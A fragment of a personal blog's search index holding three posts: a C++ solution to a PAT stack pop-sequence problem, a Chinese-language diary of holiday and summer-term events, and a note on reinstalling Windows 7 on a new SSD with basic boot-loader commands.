    <content type="text"><![CDATA[DescriptionGiven a stack which can keep M numbers at most. Push N numbers in the order of 1, 2, 3, …, N and pop randomly. You are supposed to tell if a given sequence of numbers is a possible pop sequence of the stack. For example, if M is 5 and N is 7, we can obtain 1, 2, 3, 4, 5, 6, 7 from the stack, but not 3, 2, 1, 7, 5, 6, 4. Thoughtsjust Stack simulation Long time no code and my coding ability drops significantly. This problem may be rather simple for some one, but it just serve the purpose of revieweing the basic knowledges for me. Sometimes a tiny bug can drive you crazy. No one can come to the final solution at the first glance, but as long as you spend your time on it, it will no doubt seem more ane more clear to you. Codes1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;using namespace std;int main(int argc, char const *argv[]) &#123; //freopen(&quot;D:\\cpphomework\\test.txt&quot;, &quot;r&quot;, stdin); int m, n, k;cin &gt;&gt; m &gt;&gt; n &gt;&gt; k; int **Sequence = new int * [k]; for (size_t i = 0; i &lt; k; i++) Sequence[i] = new int [n]; int *used = new int [n+1], *result = new int [n]; int remaining = m; for (size_t i = 0; i &lt; k; i++) &#123; result[i] = 1; for (size_t j = 0; j &lt; n; j++) &#123; cin &gt;&gt; Sequence[i][j]; &#125; &#125; //prepare for (size_t i = 0; i &lt; k; i++) &#123; remaining = m; for (size_t j = 1; j &lt;= n; j++) used[j]=0; int q = 1, c = 0; //start while ( q&lt;=n &amp;&amp; remaining&gt;0 &amp;&amp; result[i] ) &#123; if ( q==Sequence[i][c] ) &#123; used[q] = 1; while ( c+1&lt;n &amp;&amp; Sequence[i][c+1]&lt;Sequence[i][c] ) &#123; int examine = Sequence[i][c]-1; while ( used[examine]==1 ) examine--; if ( Sequence[i][c+1]==examine ) &#123; used[examine] = 1; remaining++;c++; &#125;else &#123; result[i] = 0;break; &#125; &#125; q++;c++; &#125; else &#123; q++;remaining--; &#125; &#125; if ( q&lt;=n ) &#123; result[i] = 0; &#125; for (size_t j = 1; result[i] &amp;&amp; j &lt;= n; j++) &#123; if ( used[j]!=1 ) &#123; result[j] = 0; break; &#125; &#125; &#125; //output for (size_t i = 0; i &lt; k; i++) &#123; switch ( result[i] ) &#123; case 1: cout &lt;&lt; &quot;YES&quot;;break; case 0: cout &lt;&lt; &quot;NO&quot;;break; &#125; if ( i!=k-1 ) cout &lt;&lt; endl; &#125; //delete for (size_t i = 0; i &lt; k; i++) delete [] Sequence[i]; delete [] Sequence; delete [] used; delete [] result; return 0;&#125;]]></content>
      <tags>
        <tag>PAT-Advanced-Level</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寒假见闻]]></title>
    <url>%2F2018%2F02%2F14%2F%E5%AF%92%E5%81%87%E8%A7%81%E9%97%BB%2F</url>
    <content type="text"><![CDATA[这个寒假我干了啥呢？ 日期 事件 5日 去九院看牙齿，得知还不能装上牙套，母生气，徐家汇购物，校医院配药 6日 外婆家，高烧，傍晚五院点滴 7日 科目四，查询报销 8日 无所事事,忘了 9日 blog 10日 收快递，驾照，win7 11日 外婆家， 12日 ？ 13日 外婆，dokidoki cao，全tm记不起来了我一直以为我可以记得很tm清楚的 不得不说，我真的是一个很拖延的人，明明知道有些事是对的事，有些事是错的事，但是我并没有去做那些对的事，也没有改掉那些错的习惯。 离开舒适区，请，求你了。 大年三十又是糟糕的一天 一整天几乎就没干什么事情 在外婆家有一种什么都干不了的感觉 真的好烦。 与其坐以待毙，不如主动出击。 大一暑假假期见闻这个暑假好像很短啊！先是忙小学期，然后稍微修整了十多天军训就轰轰烈烈地开始了，度过了这个难忘的军训之后我抽空和几位舍友一起去南京玩了两天，回来之后就是现在了，开学了，我已经大二了。 首先说说小学期吧。这个小学期我选了三门非常喜欢的课：ICS、大学生健康教育和刑法与生活。真的是学到了很多的东西，虽然最后的成绩都不是很好看，但是回想上课的那四周我真的是完全地投入其中的。哎，期末的时候千万不要太放松，你一放松期末总评就刷刷往下掉，越到期末越是不能放松啊。 虽然这中间的十几天没有参加什么有意思有意义的社会实践，但是不久就开始小班长集训了。大学的军训我是一辈子都不会忘记的，这可能是大家最后一次表现地这么有凝聚力，共同齐心协力只为了一个共同的目标的时光了。我们收获珍贵的情谊，培养过硬的作风，把军人坚韧刚毅果敢的品质内化为自己的内心力量。虽然交大的军训确实是有点水，除了队列练习基本上没有什么别的主要的内容了，体贴学生简直到了放纵的地步，但是最后那几天方阵彩排的那个闷热的上午，我第一次知道我的手臂上居然能沁出如此细密的汗珠，第一次知道汗水流到眼睛里是多么的刺眼睛，第一次感受到汗水顺着腹部流下的奇痒难忍。]]></content>
      <tags>
        <tag>寒假</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Reinstall my Win7 Ultimate]]></title>
    <url>%2F2018%2F02%2F10%2FWin7-SSD%2F</url>
    <content type="text"><![CDATA[TriggersMy old ThinkPad E430c, which my father bought in about 2012, is operatering more and more slowly nowadays. A few days ago, it even experienced several bruescreens breakups, and it took me a whole morning to just start it. After examing the hard-drive, I found that it was severely damaged, maybe due to the bumping on the road. So last night, I bought a SSD (TOSHIBA Q200 240G) PreparationsAfter searching the Internet for almost a whole day, I decided to still install the Win7 Ultimate. I also learned a lot through searching. :D I finally found a detailed tutorial called xitongcheng. It guided me to turn my original onlydisk into a USB setup disk. What I need now is only a Win7 system now (from msdn). Place the SSD in place and start your computerHere comes a terrible question.What should I do? I googled it and founded the solution. just type in three commands:123find --set-root /bootmgrchainloader /bootmgrboot and it entered the PE system. Then just choose the Win7 Ultimate. It works. install the DRIVERFirst of all, you should make sure that your computer can have access to the Internet. Then everything went on smoothly without explaination. Inflections I don’t want to reinstall any system any longer! It’s really complicated!]]></content>
  </entry>
</search>
